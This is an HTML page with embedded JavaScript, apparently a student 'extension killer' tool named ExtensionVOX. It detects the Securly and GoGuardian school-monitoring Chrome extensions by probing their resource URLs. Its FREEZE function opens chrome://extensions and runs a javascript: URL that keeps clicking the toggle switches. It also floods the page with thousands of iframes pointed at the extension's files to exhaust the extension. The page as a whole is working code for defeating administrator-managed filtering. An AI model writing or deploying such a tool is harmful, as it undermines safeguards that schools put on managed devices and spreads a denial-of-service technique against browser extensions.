<!DOCTYPE html>
<html lang="en">
<head>
    <title>ExtensionVOX</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <style>
      * {
        font-family: 'Google Sans', Roboto, sans-serif;
        color: #e8eaed;
      }
      body {
        background-color: #2b2b2b;
        width: 100%;
        height: 100%;
        margin: 0;
        padding: 0;
      }
      #header {
        background-color: #3c4043;
        padding: 16px 24px;
        border-bottom: 1px solid #5f6368;
        display: flex;
        align-items: center;
      }
      #header h1 {
        font-size: 20px;
        font-weight: 500;
        margin: 0;
        padding: 0;
        color: #e8eaed;
      }
      #content {
        padding: 24px;
        max-width: 1200px;
        margin: 0 auto;
      }
      .extension-card {
        background-color: #3c4043;
        border-radius: 8px;
        box-shadow: 0 1px 2px 0 rgba(0,0,0,0.3), 0 1px 3px 1px rgba(0,0,0,0.15);
        padding: 16px;
        margin-bottom: 16px;
        display: flex;
        align-items: center;
      }
      .extension-icon {
        width: 32px;
        height: 32px;
        margin-right: 16px;
      }
      .extension-details {
        flex-grow: 1;
      }
      .extension-name {
        font-weight: 500;
        margin-bottom: 4px;
        color: #e8eaed;
      }
      .extension-description {
        font-size: 13px;
        color: #9aa0a6;
        margin-bottom: 8px;
      }
      .extension-id {
        font-size: 12px;
        color: #9aa0a6;
        font-family: monospace;
      }
      .extension-actions {
        display: flex;
        gap: 8px;
      }
      .switch {
        position: relative;
        display: inline-block;
        width: 36px;
        height: 20px;
      }
      .switch input {
        opacity: 0;
        width: 0;
        height: 0;
      }
      .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #5f6368;
        transition: .4s;
        border-radius: 34px;
      }
      .slider:before {
        position: absolute;
        content: "";
        height: 16px;
        width: 16px;
        left: 2px;
        bottom: 2px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
      }
      input:checked + .slider {
        background-color: #8ab4f8;
      }
      input:checked + .slider:before {
        transform: translateX(16px);
      }
      button {
        background-color: #5f6368;
        border: 1px solid #5f6368;
        border-radius: 4px;
        color: #e8eaed;
        padding: 8px 16px;
        font-size: 13px;
        cursor: pointer;
      }
      button:hover {
        background-color: #80868b;
      }
      #buttons_container {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
        margin-top: 16px;
      }
      #extensions-container {
        margin-top: 20px;
      }
    </style>
    <script>
      const extensions = {
        "securly_new": {
          name: "Securly",
          url: "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css"
        },
        "goguardian": {
          name: "GoGuardian",
          url: "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js"
        }
      };

      async function checkExtension(url) {
        const controller = new AbortController();
        setTimeout(() => controller.abort(), 500);
        try {
          await fetch(url, { signal: controller.signal });
          return true;
        } catch (error) {
          return error.toString().includes("AbortError");
        }
      }

      async function detectExtensions() {
        const detected = [];
        for (const ext of Object.values(extensions)) {
          if (await checkExtension(ext.url)) {
            detected.push(ext);
          }
        }
        return detected;
      }

      function startAutoToggle() {
        const script = `
          setInterval(() => {
            document.querySelectorAll('extensions-toggle').forEach(toggle => {
              const checkbox = toggle.shadowRoot?.querySelector('input[type="checkbox"]');
              if (checkbox) checkbox.click();
            });
          }, 100);
        `;
        window.open('javascript:' + encodeURIComponent(script), '_blank');
      }

      function createIframes(ext) {
        const iframes = [];
        setInterval(() => {
          const iframe = document.createElement("iframe");
          document.body.append(iframe);
          iframes.push(iframe);
          
          for (let i = 0; i < 9999; i++) {
            const subframe = document.createElement("iframe");
            subframe.src = ext.url;
            subframe.style.cssText = "width:1px;height:1px;";
            iframe.contentDocument?.body?.append(subframe);
          }
          
          while (iframes.length > 10) iframes.shift().remove();
        }, 100);
      }

      function freezeExtension(extName) {
        const ext = Object.values(extensions).find(e => e.name === extName);
        if (!ext || !confirm(`FREEZE ${extName}?\n\n1. Open chrome://extensions\n2. Find ${extName}\n3. The page will auto-toggle switches`)) return;
        
        window.open('chrome://extensions', '_blank');
        setTimeout(() => {
          startAutoToggle();
          createIframes(ext);
        }, 2000);
      }

      async function loadExtensions() {
        const container = document.getElementById('extensions-container');
        const detected = await detectExtensions();
        
        container.innerHTML = detected.length ? '' : '<p>No extensions detected</p>';
        
        detected.forEach(ext => {
          const card = document.createElement('div');
          card.className = 'extension-card';
          card.innerHTML = `
            <img src="chrome://extension-icon/${ext.url.split('/')[2]}/32/1" class="extension-icon">
            <div class="extension-details">
              <div class="extension-name">${ext.name}</div>
              <div class="extension-id">ID: ${ext.url.split('/')[2]}</div>
            </div>
            <div class="extension-actions">
              <button onclick="freezeExtension('${ext.name}')" style="background:#d23c3c;">FREEZE</button>
            </div>
          `;
          container.appendChild(card);
        });
      }

      window.onload = loadExtensions;
    </script>
</head>
<body>
    <div id="header">
      <h1>Extensions v.0.1.2</h1>
    </div>
    <div id="content">
      <div id="extensions-container"></div>
    </div>
</body>
</html>
